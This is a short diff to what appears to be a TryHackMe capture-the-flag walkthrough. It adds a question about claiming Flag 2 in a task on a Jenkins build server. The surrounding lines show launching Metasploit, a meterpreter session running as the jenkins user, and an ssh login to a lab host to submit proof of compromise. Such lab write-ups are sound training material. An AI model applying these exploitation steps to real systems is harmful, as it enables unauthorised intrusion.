@@ -132,6 +132,8 @@ Your flag value is: THM{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
 
 ## Task 7: Securing the Build Server
 
+**Authenticate to Mother and follow the process to claim Flag 2. What is Flag 2?**
+
 * Run the exploit using **Metasploit**:
 ```shell
 msfconsole
@@ -158,7 +160,6 @@ run
 meterpreter > getuid
 Server username: jenkins
 ```
-
 * Submit proof of compromise to **mother** from the AttackBox:
 ```shell
 ssh mother@x.x.6.250
